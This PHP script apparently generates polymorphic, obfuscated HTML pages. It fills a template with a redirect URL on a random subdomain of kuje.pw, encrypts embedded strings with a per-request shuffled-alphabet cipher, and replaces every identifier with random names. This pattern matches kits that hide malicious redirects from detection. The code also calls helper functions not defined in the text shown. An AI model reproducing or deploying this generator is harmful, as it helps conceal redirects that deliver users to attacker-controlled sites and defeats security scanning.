<?php
  function random($length = 10) {
      $characters = 'abcdefghijklmnopqrstuvwxyz';
      $randomString = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, strlen($characters) - 1)];
      }
      return $randomString;
  }

  function encode($metin,$kripto,$alfabe,$charlen){
    $sifreli = "";
    $metin = random($charlen).$metin;
    for($i=0;$i<strlen($metin);$i++){
      if(strpos($alfabe,$metin[$i]) !== false){
        $sifreli .= $kripto[$i%count($kripto)][strpos($alfabe,$metin[$i])];
      }else{
        $sifreli .= $metin[$i];
      }
    }
    return $sifreli;
  }

  function getrandomkripto(){
    $alfabe = "ABCDEFGHIJKLMNOPRSTUVYZXabcdefghijklmnoprstuvyzx0123456789:/.=?_";
    $k = str_shuffle($alfabe);
    return $k;
  }
  $html = file_get_contents("template.html");
  $jsurl = "http://".generate_name(rand(5,15)).".kuje.pw/php/redirect.php";

  $kripto = array();
  for($i=0;$i<rand(4,10);$i++){
    $kripto[] = getrandomkripto(); 
  }
  $alfabe = getrandomkripto();

  $variables = array(
    "kriptoarray" => json_encode($kripto),
    "alfabestr" => $alfabe,
    "jsurl" => $jsurl
  );

  foreach ($variables as $key => $value) {
    $html = str_replace("{".$key."}", $value, $html);
  }

  while(strpos($html, "{random}") !== false){
    $html = str_replace_first("{random}", random(rand(5,6)), $html);
  }

  preg_match_all("/{decode}\(\"(.*?)\"\)/", $html, $encodes);
  $encodes = $encodes[0];
  foreach ($encodes as $encoded) {
    preg_match("/{decode}\(\"(.*)\"\)/", $encoded, $variable);
    $charlen = rand(1,15);
    $bool = rand(1,2) == 1 ? "true":"false";
    $html = str_replace($encoded, '{decode}("'.encode($variable[1],$kripto,$alfabe,$charlen).'",'.$charlen.','.$bool.')', $html);
  }

  $html = str_replace("{decode}", random(rand(5,8)), $html);

  $variables = array();
  preg_match_all("/{(.*?)}/", $html, $variables);
  $variables = $variables[0];
  foreach ($variables as $key) {
    $html = str_replace($key, random(rand(5,6)), $html);
  }

  echo $html;
?>
